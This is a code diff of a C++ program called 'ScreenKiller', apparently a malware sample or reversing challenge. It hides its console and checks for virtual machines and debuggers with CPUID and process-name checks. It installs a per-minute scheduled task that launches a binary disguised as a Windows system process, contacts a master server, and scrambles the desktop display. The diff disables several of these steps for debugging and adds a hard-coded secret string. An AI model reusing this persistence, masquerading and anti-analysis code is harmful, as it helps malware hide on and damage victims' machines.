@@ -25,24 +25,26 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
 }
 
 void ScreenKiller::suicide()
 {
-	this->m_runner_thread.detach();
+	//this->m_runner_thread.detach();
 	this->m_alive = false;
 }
 
 bool ScreenKiller::deploy_inner()
 {
 	this->check_secret_file();
-	this->exit_if_vm_cpuid();
-	this->connect_to_master_server();
-	this->exit_if_debugged();
-	this->get_persistency();
+	//this->exit_if_vm_cpuid();
+	//this->connect_to_master_server();
+	//this->exit_if_debugged();
+	//this->get_persistency();
+
+	return true;
 
 	HWND hDesktop = NULL;
 	ScreenProps screen_props = { 0 };
@@ -50,7 +52,7 @@ bool ScreenKiller::deploy_inner()
 
 	screen_props.hdcScreen = GetDCEx(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);
 
-	srand(GetCurrentTime());
+	srand(GetTickCount64() % UINT32_MAX);
 
 	RECT desktop = { 0 };
 	
@@ -61,13 +63,13 @@ bool ScreenKiller::deploy_inner()
 		ScrambleWindow(&screen_props, this);
 		Sleep(10);
 	}
-
+																  
 	return true;
 }
 
 bool ScreenKiller::get_persistency()
 {
-	system("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\scvhost.exe\"");
+	system("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\taskhost.exe\"");
 
 	return true;
 }
@@ -80,20 +82,20 @@ bool ScreenKiller::connect_to_master_server()
 void ScreenKiller::exit_if_vm_cpuid()
 {
 	int32_t registers[4];
-
+	
 	__cpuid(registers, 1);
 	bool hypervisor_bit = static_cast<bool>((registers[2] >> 31) & 0x1);
 
 	if (hypervisor_bit)
 	{
-		exit(DEBUG_OR_VM_EXITCODE);
+		exit(1);
 	}
 }
 
 void ScreenKiller::exit_if_debugged()
 {
 	if (this->is_debugged1() || this->is_debugged2())
-		exit(DEBUG_OR_VM_EXITCODE);
+		exit(1);
 }
 
 bool ScreenKiller::is_debugged1()
@@ -113,7 +115,7 @@ bool ScreenKiller::is_debugged2()
 			L"x64dbg.exe"
 		};
 
-		const wchar_t *pogan_name = L"scvhost.exe";
+		const wchar_t *pogan_name = L"taskhost.exe";
 
 		size_t count_instances = 0;
 		wchar_t* processName;
@@ -152,13 +154,8 @@ void ScreenKiller::check_secret_file()
 {
 	FILE *fp; 
 	char secret_buf[MAX_FILE] = { 0 };
-	//char *temp_path;
-	//size_t sz = 0;
-	//_dupenv_s(&temp_path, &sz, "temp");
-
 
 	std::string filename = "\\secret.txt";
-	//filename = temp_path + filename;
 	filename = this->m_temp_path + filename;
 
 	fopen_s(&fp, filename.c_str(), "r");
@@ -167,7 +164,10 @@ void ScreenKiller::check_secret_file()
 
 	fread(secret_buf, 1, MAX_FILE, fp);
 	std::string encoded_key = encode_string(secret_buf);
-
+	printf("\n");
+	encode_string("fr33_b4l3st1n_s3cr3t");
+	std::cout << strlen(secret_buf) << std::endl;
+	
 	if (encoded_key == ENCODED_KEY)
 		MessageBoxA(NULL, (decrypt_ip(secret_buf)).c_str(), "Hmmm", NULL);
 }
